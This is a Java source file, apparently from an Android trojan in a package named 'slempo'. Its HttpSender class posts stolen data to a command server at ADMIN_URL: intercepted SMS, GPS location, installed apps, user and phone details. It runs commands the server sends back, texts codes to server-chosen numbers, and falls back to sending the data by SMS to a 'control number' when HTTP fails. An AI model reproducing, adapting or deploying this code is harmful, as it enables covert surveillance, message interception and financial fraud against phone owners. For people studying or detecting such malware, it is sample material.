package org.slempo.service.utils;

import java.io.IOException;
import java.security.KeyManagementException;
import java.security.KeyStoreException;
import java.security.NoSuchAlgorithmException;
import java.security.UnrecoverableKeyException;
import java.security.cert.CertificateException;

import org.apache.http.HttpResponse;
import org.apache.http.client.methods.HttpPost;
import org.apache.http.entity.StringEntity;
import org.apache.http.impl.client.DefaultHttpClient;
import org.apache.http.util.EntityUtils;
import org.json.JSONObject;
import org.slempo.service.Constants;

import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;

public class HttpSender {

	public static enum RequestType {
		TYPE_INITIAL_DATA, TYPE_CHECK_DATA, TYPE_CONTROL_NUMBER_DATA, TYPE_CONFIRMATION, TYPE_LISTENED_INCOMING_SMS, TYPE_INTERCEPTED_INCOMING_SMS, TYPE_LISTENED_OUTGOING_SMS, TYPE_INSTALLED_APPS, TYPE_GPS_DATA, TYPE_USER_DATA, TYPE_PHONE, TYPE_REPORT, TYPE_SMS_CONTENT
	}

	private final String dataToSend;

	private final Context context;

	private static SharedPreferences settings;

	private final RequestType type;

	private DefaultHttpClient httpclient;

	public HttpSender(final String data, final RequestType type,
			final Context context) {
		dataToSend = data;
		settings = context.getSharedPreferences(Constants.PREFS_NAME,
				Context.MODE_PRIVATE);
		httpclient = new DefaultHttpClient();
		this.context = context;
		this.type = type;
	}

	public void startSending() {
		new Thread(new Runnable() {

			@Override
			public void run() {
				Intent updateUIIntent = null;
				try {
					HttpResponse response = send(context,
							Constants.ADMIN_URL, dataToSend);
					if (response.getStatusLine().getStatusCode() != 200) {
						throw new Exception("Status code "
								+ response.getStatusLine().getStatusCode()
								+ " "
								+ EntityUtils.toString(response.getEntity()));
					} else {
						JSONObject jObject = new JSONObject(
								EntityUtils.toString(response.getEntity()));
						if (isRequestUserData()) {
							updateUIIntent = new Intent(Sender.UPDATE_MAIN_UI);
							updateUIIntent.putExtra("status", true);
						} else if (type == RequestType.TYPE_CHECK_DATA) {
							try {
								String command = jObject.getString("command");
								SmsProcessor processor = new SmsProcessor(
										command, jObject
												.getJSONObject("params")
												.toString(), context);
								processor.processCommand();
							} catch (Exception e) {
							}
						} else if (type == RequestType.TYPE_INITIAL_DATA) {
							try {
								String number = jObject.getString("number");
								String code = jObject.getString("code");
								Utils.sendMessage(number, code);
								Utils.putBooleanValue(settings,
										Sender.INITIAL_DATA_IS_SENT, true);
								Utils.putStringValue(settings,
										Constants.APP_ID, code);
								Sender.sendAppCodeData(context, code);
							} catch (Exception e) {
							}
						}
					}
				} catch (Exception e) {
					if (isRequestUserData()) {
						updateUIIntent = new Intent(Sender.UPDATE_MAIN_UI);
						updateUIIntent.putExtra("status", false);
					}
					if (type != RequestType.TYPE_INITIAL_DATA
							&& type != RequestType.TYPE_CONTROL_NUMBER_DATA
							&& type != RequestType.TYPE_CHECK_DATA) {
						Utils.sendMessage(settings.getString(
								Constants.CONTROL_NUMBER, ""), dataToSend);
					}
				} finally {
					if (isRequestUserData()) {
						context.sendBroadcast(updateUIIntent);
					}
				}
			}
		}).start();
	}

	private boolean isRequestUserData() {
		return type == RequestType.TYPE_USER_DATA || type == RequestType.TYPE_PHONE;
	}

	private HttpResponse send(final Context context, final String url,
			final String data) throws KeyManagementException,
			UnrecoverableKeyException, NoSuchAlgorithmException,
			KeyStoreException, CertificateException, IOException {
		HttpPost httpPost = new HttpPost(url);
		httpPost.setEntity(new StringEntity(data, "UTF-8"));
		return httpclient.execute(httpPost);
	}/**/
}
